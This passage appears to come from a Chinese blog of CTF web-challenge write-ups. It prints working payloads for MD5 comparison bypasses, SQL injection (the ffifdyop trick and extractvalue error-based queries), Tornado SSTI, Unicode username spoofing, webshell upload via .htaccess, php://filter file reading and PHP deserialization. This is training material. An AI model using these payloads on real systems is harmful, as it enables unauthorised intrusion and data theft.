src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">根据我们以往所学，他说字符太长了，我们可以通过科学计数法来解决这种问题</p><blockquote><p>构造payload  password&#x3D;404a&amp;money&#x3D;1e9 </p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041758573.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="BJDCTF2020-Easy-MD5"><a href="#BJDCTF2020-Easy-MD5" class="headerlink" title="[BJDCTF2020]Easy MD5"></a>[BJDCTF2020]Easy MD5</h2><h3 id="一、本题做题思路-15"><a href="#一、本题做题思路-15" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开界面什么都得不到，输入也没什么变化</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041759496.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">在抓包的时候找到了提示<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041759493.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">即构造$pass经md5加密后出现**<code>or</code>** ，可令该SQL语句返回**<code>true</code><strong>。不过还是不会，看大佬WP是用</strong><code>ffifdyop</code><strong>绕过，因为这个字符被MD5哈希了之后前几位刚好是</strong><code>&#39; or &#39;6</code>** 所以这里就绕过去了。</p><p>跳转到一个新的网站，从源代码里可以找到本题解题关键</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041800595.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>))&#123;</span><br><span class="line">    <span class="comment">// wow, glzjin wants a girl friend.</span></span><br><span class="line">--&gt;</span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">$a不等于$b，但是md5($a)等于md5($b),平常经常遇到的md5弱等于绕过。</p><blockquote><p>可以构建   url+&#x2F;levels91.php?a&#x3D;QNKCDZO&amp;b&#x3D;240610708</p></blockquote><p>又进入一个新的网页</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041800536.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;flag.php&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>]!==<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]&amp;&amp;<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param1&#x27;</span>])===<span class="title function_ invoke__">md5</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;param2&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">这又考我们md5强等于绕过，可以通过数组绕过来得到flag</p><blockquote><p>构建payload为 param1[]&#x3D;1&amp;param2[]&#x3D;2 </p></blockquote><p>得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041800930.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-8"><a href="#二、本题知识点-8" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><blockquote><p>(1)、绕过md5进行注入，通过其进行哈希后的前几位字母满足注入公式所需从而达成目的</p><p>(2)、MD5弱等于绕过，其实可以看<a href="https://www.cnblogs.com/87x00/p/15832075.html">这个佬的博客</a>，已经将弱等于和强等于都说了，弱等于就是部分字符串md5后是0exxx，刚好满足科学计数法，在弱等于当中，函数会判断其相等，但是其本质又不想等，所以可以绕过</p><p>(3)、MD5强等于绕过，通过数组进行绕过。因为md5函数无法处理数组。</p></blockquote><h2 id="护网杯-2018-easy-tornado"><a href="#护网杯-2018-easy-tornado" class="headerlink" title="[护网杯 2018]easy_tornado"></a>[护网杯 2018]easy_tornado</h2><h3 id="一、本题做题思路-16"><a href="#一、本题做题思路-16" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p>打开发现有三个txt文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801607.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><p>flag.txt</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801589.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">welcome.txt</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801598.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> hints.txt</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801599.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">且当我们在访问的时候，我们可以发现有参数传入</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801611.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><strong>filename</strong>和<strong>filehash 。</strong>   </p><p>结合flag.txt里的内容，想要得到flag应该是构造</p><blockquote><p>url+&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;md5(cookie_secret+md5(filename))</p></blockquote><p>但是我们不知道cookie_secret在哪。不过既然flag.txt和hints.txt都用了，那么八成线索是在最后一个文本render。通过上网查询和看大佬wp。得知**render()**是tornado里的函数，可以**生成html模板。**再结合本题题目easy_tornado。猜测为SSTI服务器模板注入。</p><p>具体可去<a href="https://www.tornadoweb.org/en/stable/web.html">该网站</a>了解</p><p>所以先尝试</p><blockquote><p>url+&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;1</p></blockquote><p>回显为 Error</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801591.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">报错说明可能存在过滤，尝试通过该模板测试是否有SSTI注入</p><blockquote><p>url+&#x2F;error?msg&#x3D;1 </p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801968.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">能注入，所以我们可以去尝试找到cookie_secret</p><p>在Tornado框架的附属文件handler.settings中存在cookie_secret。所以我们可以构造payload如下</p><blockquote><p>url+&#x2F;error?msg&#x3D;</p></blockquote><p>得到cookie_secret。</p><blockquote><p>cookie_secret&#x3D;3742f17c04ab407ca3bf4fa775921ec2(杠被我去掉了)</p></blockquote><p>重新返回最初的地方去尝试获取flag。</p><blockquote><p>即可构造url+&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;md5(cookie_secret+md5(&#x2F;fllllllllllllag))</p></blockquote><p>经过计算可构造</p><blockquote><p>url+&#x2F;file?filename&#x3D;&#x2F;fllllllllllllag&amp;filehash&#x3D;57fb487e8a01aeae99949369c6022f78</p></blockquote><p>得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041801964.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h3 id="二、本题知识点-9"><a href="#二、本题知识点-9" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p> 基本上都是参考这个<a href="https://blog.csdn.net/qq_51927659/article/details/116031923?spm=1001.2014.3001.5502">大佬博客</a>从而达到复现的结果。</p><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="一、本题做题思路-17"><a href="#一、本题做题思路-17" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041803458.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">通过主页面发现有俩个选项，一个登录，一个注册。根据题目先试试admin登录一下</p><p>额，发现username输入admin password输入123直接就得到了flag</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041803668.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">但这题其实有很多解法，例如flask 伪造，session漏洞和Unicode欺骗，前俩个学的不咋地，这里就用Unicode欺骗来解决一下。</p><p>我们可以从Unicode字符表里找到如下图的位置 <a href="https://www.rapidtables.org/zh-CN/code/text/unicode-characters.html">该表网址</a></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041803663.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">从里面凑齐一个ᴬᴰᴹᴵᴺ，然后注册，注册完后登录然后进行修改密码。</p><p>然后再用修改后的密码，用户名为admin登录得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041803630.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">其原理为 当我们在注册的时候 ”ᴬᴰᴹᴵᴺ“ 经过strlower()，转成”ADMIN“ ， 在修改密码的时候 ”ADMIN“经过strlower()变成”admin“ , 当我们再次退出登录的时候 ”admin“经过strlower()变成”admin”</p><p><strong>strlower:将字符串转换为小写。</strong></p><h3 id="二、本题知识点-10"><a href="#二、本题知识点-10" class="headerlink" title="二、本题知识点"></a>二、本题知识点</h3><p>通过Unicode欺骗使自己成为admin登录网站得到flag</p><p>以及弱口令爆破。</p><p>如果想知道另俩种做法，可以看这位<a href="https://www.cnblogs.com/chrysanthemum/p/11722351.html">大佬博客</a></p><h2 id="MRCTF2020-你传你🐎呢"><a href="#MRCTF2020-你传你🐎呢" class="headerlink" title="[MRCTF2020]你传你🐎呢"></a>[MRCTF2020]你传你🐎呢</h2><p>一、本题做题思路</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805097.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">一道Upload的题，尝试上传一下PHP文件</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805013.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">传不进去，通过图片传入试试</p><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805556.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">回显为成功上传，那么通过htaccess文件来使蚁剑连接</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805593.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">成功上传</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805562.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">成功进入，通过主目录内找到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805573.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041805588.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><h2 id="ZJCTF-2019-NiZhuanSiWei"><a href="#ZJCTF-2019-NiZhuanSiWei" class="headerlink" title="[ZJCTF 2019]NiZhuanSiWei"></a>[ZJCTF 2019]NiZhuanSiWei</h2><h3 id="一、本题做题思路-18"><a href="#一、本题做题思路-18" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041806984.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">打开后就是一串php代码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="variable">$text</span> = <span class="variable">$_GET</span>[<span class="string">&quot;text&quot;</span>];</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$_GET</span>[<span class="string">&quot;password&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$text</span>)&amp;&amp;(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>)===<span class="string">&quot;welcome to the zjctf&quot;</span>))&#123;<span class="comment">//要求我们传入一个text文件，内容为welcome to the zjctf</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;h1&gt;&quot;</span>.<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$text</span>,<span class="string">&#x27;r&#x27;</span>).<span class="string">&quot;&lt;/h1&gt;&lt;/br&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag/&quot;</span>,<span class="variable">$file</span>))&#123;<span class="comment">//正则运算将flag过滤</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Not now!&quot;</span>;</span><br><span class="line">        <span class="keyword">exit</span>(); </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">include</span>(<span class="variable">$file</span>);  <span class="comment">//useless.php//提示一个php</span></span><br><span class="line">        <span class="variable">$password</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$password</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$password</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">**file_get_contents()**函数在我们上面一道题中使用过，是用来读取文件。’r’是读取方式</p><p>通过<strong>php:&#x2F;&#x2F;input</strong>绕过该函数 </p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041806850.png"></p><p>正则将flag过滤了，下面给出一个php，但如果直接访问只会得到一个白屏，其他什么也得不到</p><p>所以我们可以通过php伪协议 php:&#x2F;&#x2F;filter 读取</p><blockquote><p>所以构造payload url+&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;useless.php</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807697.png">得到一串base64代码，解密后得到</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"> </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;  <span class="comment">//flag.php  </span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;  </span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;file))&#123;  </span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;file); </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> (<span class="string">&quot;U R SO CLOSE !///COME ON PLZ&quot;</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"><span class="meta">?&gt;</span>  </span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">再结合主页面的unserialize()函数，显然我们需要将这个进行序列化</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807656.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="></p><blockquote><p> 然后输入最终的payload</p><p>url+&#x2F;?text&#x3D;php:&#x2F;&#x2F;input&amp;file&#x3D;useless.php&amp;password&#x3D;O:4:”Flag”:1:{s:4:”file”;s:8:”flag.php”;}</p></blockquote><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807815.png"></p><p>得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041807711.png"></p><h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><h3 id="一、本题做题思路-19"><a href="#一、本题做题思路-19" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p> SQL注入，先看是什么闭合方式</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808245.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808154.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">确定为’闭合。<img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808161.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">union被过滤掉 ，还有空格也被过滤，所以我们需要使用括号绕过，但同时这道题没有过滤extractvalue。所以我们可以尝试用这来解决问题</p><p><strong>获取数据库名</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span><span class="string">&#x27;^extractvalue(1,concat(0x7e,(select(database()))))%23&amp;password=1</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808227.png"></p><p> <strong>爆破表名得到字段名</strong> </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span><span class="string">&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(&#x27;</span>geek<span class="string">&#x27;))))%23&amp;password=1</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://img-blog.csdnimg.cn/16f5b94d16224701aa37757f559c599e.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> <strong>查看字段名内内容</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span><span class="string">&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;</span>H4rDsq1<span class="string">&#x27;))))%23&amp;password=1</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808264.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> <strong>获取用户名和密码，出现一部分flag</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/check.php?username=<span class="number">1</span><span class="string">&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1))))%23&amp;password=1</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808731.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">然后可以使用left()和right()函数进行拼接，这里直接使用right函数，然后再把重复的删去组成flag</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=<span class="number">1</span><span class="string">&#x27;^extractvalue(1,concat(0x7e,(select(group_concat(right(password,20)))from(H4rDsq1))))%23&amp;password=1</span></span><br></pre></td></tr></table></figure><p><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041808951.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw=="> 去掉重复的即为最终的flag答案。</p><h2 id="MRCTF2020-Ez-bypass"><a href="#MRCTF2020-Ez-bypass" class="headerlink" title="[MRCTF2020]Ez_bypass"></a>[MRCTF2020]Ez_bypass</h2><h3 id="一、本题做题思路-20"><a href="#一、本题做题思路-20" class="headerlink" title="一、本题做题思路"></a>一、本题做题思路</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202306041810758.png"><img src="data:image/gif;base64,R0lGODlhAQABAPABAP///wAAACH5BAEKAAAALAAAAAABAAEAAAICRAEAOw==">代码如下 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="variable">$flag</span>=<span class="string">&#x27;MRCTF&#123;xxxxxxxxxxxxxxxxxxxxxxxxx&#125;&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>])&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$id</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">    <span class="variable">$gg</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;gg&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$id</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$gg</span>) &amp;&amp; <span class="variable">$id</span> !== <span class="variable">$gg</span>) &#123;<span class="comment">//md5强等于绕过</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;You got the first step&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>])) &#123;</span><br><span class="line">            <span class="variable">$passwd</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;passwd&#x27;</span>];</span><br><span class="line">            <span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$passwd</span>))<span class="comment">//$passwd不能是数字</span></span><br><span class="line">            &#123;</span><br><span class="line">                 <span class="keyword">if</span>(<span class="variable">$passwd</span>==<span class="number">1234567</span>)<span class="comment">//弱等于为1234567</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&#x27;Good Job!&#x27;</span>;</span><br><span class="line">                     <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">                     <span class="keyword">die</span>(<span class="string">&#x27;By Retr_0&#x27;</span>);</span><br><span class="line">                 &#125;</span><br><span class="line">                 <span class="keyword">else</span></span><br><span class="line">                 &#123;</span><br><span class="line">                     <span class="keyword">echo</span> <span class="string">&quot;can you think twice??&quot;</span>;</span><br><span class="line">                 &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&#x27;You can not get it !&#x27;</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;only one way to get the flag&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;You are not a real hacker!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span 